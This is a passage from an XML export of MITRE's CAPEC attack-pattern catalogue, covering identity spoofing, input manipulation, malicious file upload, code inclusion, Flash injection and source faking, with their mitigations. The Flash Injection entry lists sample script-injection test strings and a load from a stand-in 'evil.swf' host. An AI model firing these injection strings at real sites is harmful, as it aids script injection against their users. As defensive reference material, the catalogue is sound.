            <ns0:Example>Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="400" />
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Solutions_and_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="151" Name="Identity Spoofing" Abstraction="Meta" Status="Stable">
         <ns0:Description>Identity Spoofing refers to the action of assuming (i.e., taking on) the identity of some other entity (human or non-human) and then using that identity to accomplish a goal. An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>Alternatively, an adversary may intercept a message from a legitimate sender and attempt to make it look like the message comes from them without changing its content. The latter form of this attack can be used to hijack credentials from legitimate users. Identity Spoofing attacks need not be limited to transmitted messages - any resource that is associated with an identity (for example, a file with a signature) can be the target of an attack where the adversary attempts to change the apparent identity. This attack differs from Content Spoofing attacks where the adversary does not wish to change the apparent identity of the message but instead wishes to change what the message says. In an Identity Spoofing attack, the adversary is attempting to change the identity of the content.</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The identity associated with the message or resource must be removable or modifiable in an undetectable way.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Authentication</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Employ robust authentication processes (e.g., multi-factor authentication).</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="287" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="153" Name="Input Data Manipulation" Abstraction="Meta" Status="Draft">
         <ns0:Description>An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.</html:p>
         </ns0:Extended_Description>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="17" Name="Using Malicious Files" Abstraction="Standard" Status="Draft">
         <ns0:Description>An attack of this type exploits a system's configuration that allows an adversary to either directly access an executable file, for example through shell access; or in a possible worst case allows an adversary to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="122">
               <ns0:Exclude_Related Exclude_ID="515" />
            </ns0:Related_Attack_Pattern>
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="233" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine File/Directory Configuration] The adversary looks for misconfigured files or directories on a system that might give executable access to an overly broad group of users.</ns0:Description>
               <ns0:Technique>Through shell access to a system, use the command "ls -l" to view permissions for files and directories.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Upload Malicious Files] If the adversary discovers a directory that has executable permissions, they will attempt to upload a malicious file to execute.</ns0:Description>
               <ns0:Technique>Upload a malicious file through a misconfigured FTP server.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Execute Malicious File] The adversary either executes the uploaded malicious file, or executes an existing file that has been misconfigured to allow executable access to the adversary.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To identify and execute against an over-privileged system interface</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Enforce principle of least privilege</ns0:Mitigation>
            <ns0:Mitigation>Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Consider a directory on a web server with the following permissions</html:p>
               <html:div style="margin-left:1em;" class="informative">drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot</html:div>
               <html:p>This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="732" />
            <ns0:Related_Weakness CWE_ID="285" />
            <ns0:Related_Weakness CWE_ID="272" />
            <ns0:Related_Weakness CWE_ID="59" />
            <ns0:Related_Weakness CWE_ID="282" />
            <ns0:Related_Weakness CWE_ID="270" />
            <ns0:Related_Weakness CWE_ID="693" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1574.005</ns0:Entry_ID>
               <ns0:Entry_Name>Hijack Execution Flow: Executable Installer File Permissions Weakness</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1574.010</ns0:Entry_ID>
               <ns0:Entry_Name>Hijack Execution Flow: Services File Permissions Weakness</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Related_Attack_Patterns, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2018-07-31">Accessing, Modifying or Executing Executable Files</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="175" Name="Code Inclusion" Abstraction="Meta" Status="Stable">
         <ns0:Description>An adversary exploits a weakness on the target to force arbitrary code to be retrieved locally or from a remote location and executed. This differs from code injection in that code injection involves the direct inclusion of code while code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target application must include external code/libraries that are executed when the application runs and the adversary must be able to influence the specific files that get included.</ns0:Prerequisite>
            <ns0:Prerequisite>The victim must run the targeted application, possibly using the crafted parameters that the adversary uses to identify the code to include.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>The adversary may need the capability to host code modules if they wish their own code files to be included.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Example_Instances>
            <ns0:Example>One example of this type of attack pattern is PHP file include attacks where the parameter of an include() function is set by a variable that an attacker is able to control. The result is that arbitrary code could be loaded into the PHP application and executed.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Activation_Zone, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="182" Name="Flash Injection" Abstraction="Standard" Status="Draft">
         <ns0:Description>An attacker tricks a victim to execute malicious flash content that executes commands or makes flash calls specified by the attacker. One example of this attack is cross-site flashing, an attacker controlled parameter to a reference call loads from content specified by the attacker.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="137" />
            <ns0:Related_Attack_Pattern Nature="CanAlsoBe" CAPEC_ID="248" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Find Injection Entry Points] The attacker first takes an inventory of the entry points of the application.</ns0:Description>
               <ns0:Technique>Spider the website for all available URLs that reference a Flash application.</ns0:Technique>
               <ns0:Technique>List all uninitialized global variables (such as _root.*, _global.*, _level0.*) in ActionScript, registered global variables in included files, load variables to external movies.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Determine the application's susceptibility to Flash injection] Determine the application's susceptibility to Flash injection. For each URL identified in the explore phase, the attacker attempts to use various techniques such as direct load asfunction, controlled evil page/host, Flash HTML injection, and DOM injection to determine whether the application is susceptible to Flash injection.</ns0:Description>
               <ns0:Technique>Test the page using direct load asfunction, getURL,javascript:gotRoot("")///d.jpg</ns0:Technique>
               <ns0:Technique>Test the page using controlled evil page/host, http://example.com/evil.swf</ns0:Technique>
               <ns0:Technique>Test the page using Flash HTML injection, "'&gt;&lt;img src='asfunction:getURL,javascript:gotRoot("")//.jpg' &gt;</ns0:Technique>
               <ns0:Technique>Test the page using DOM injection, (gotRoot(''))</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Inject malicious content into target] Inject malicious content into target utilizing vulnerable injection vectors identified in the Experiment phase</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target must be capable of running Flash applications. In some cases, the victim must follow an attacker-supplied link.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">The attacker needs to have knowledge of Flash, especially how to insert content the executes commands.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack. The attacker may need to be able to serve the injected Flash content.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Other</ns0:Impact>
               <ns0:Note>Information Leakage</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Accountability</ns0:Scope>
               <ns0:Scope>Authentication</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Scope>Non-Repudiation</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Implementation: remove sensitive information such as user name and password in the SWF file.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: use validation on both client and server side.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: remove debug information.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: use SSL when loading external data</ns0:Mitigation>
            <ns0:Mitigation>Implementation: use crossdomain.xml file to allow the application domain to load stuff or the SWF file called by other domain.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>In the following example, the SWF file contains</html:p>
               <html:div style="margin-left:1em;" class="informative">getURL('javascript:SomeFunc("someValue")','','GET')</html:div>
               <html:p>A request like</html:p>
               <html:div style="margin-left:1em;" class="informative">http://example.com/noundef.swf?a=0:0;alert('XSS')</html:div>
               <html:p>becomes</html:p>
               <html:div style="margin-left:1em;" class="informative">javascript:SomeFunc("someValue")?a=0:0;alert(123)</html:div>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="184" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-46" />
            <ns0:Reference External_Reference_ID="REF-47" />
            <ns0:Reference External_Reference_ID="REF-48" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="194" Name="Fake the Source of Data" Abstraction="Standard" Status="Stable">
         <ns0:Description>An adversary takes advantage of improper authentication to provide data or services under a falsified identity. The purpose of using the falsified identity may be to prevent traceability of the provided data or to assume the rights granted to another individual. One of the simplest forms of this attack would be the creation of an email message with a modified "From" field in order to appear that the message was sent from someone other than the actual sender. The root of the attack (in this case the email system) fails to properly authenticate the source and this results in the reader incorrectly performing the instructed action. Results of the attack vary depending on the details of the attack, but common results include privilege escalation, obfuscation of other attacks, and data corruption/manipulation.</ns0:Description>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="151">
               <ns0:Exclude_Related Exclude_ID="512" />
            </ns0:Related_Attack_Pattern>
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="657" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="667" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This attack is only applicable when a vulnerable entity associates data or services with an identity. Without such an association, there would be no reason to fake the source.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>Resources required vary depending on the nature of the attack. Possible tools needed by an attacker could include tools to create custom network packets, specific client software, and tools to capture network traffic. Many variants of this attack require no attacker resources, however.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Alter Execution Logic</ns0:Impact>
               <ns0:Note>By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
               <ns0:Note>By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Hide Activities</ns0:Impact>
               <ns0:Note>Faking the source of data or services can be used to create a false trail in logs as the target will associate any actions with the impersonated identity instead of the adversary.</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="287" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>38</ns0:Entry_ID>
               <ns0:Entry_Name>URL Redirector Abuse</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="197" Name="Exponential Data Expansion" Abstraction="Detailed" Status="Draft">
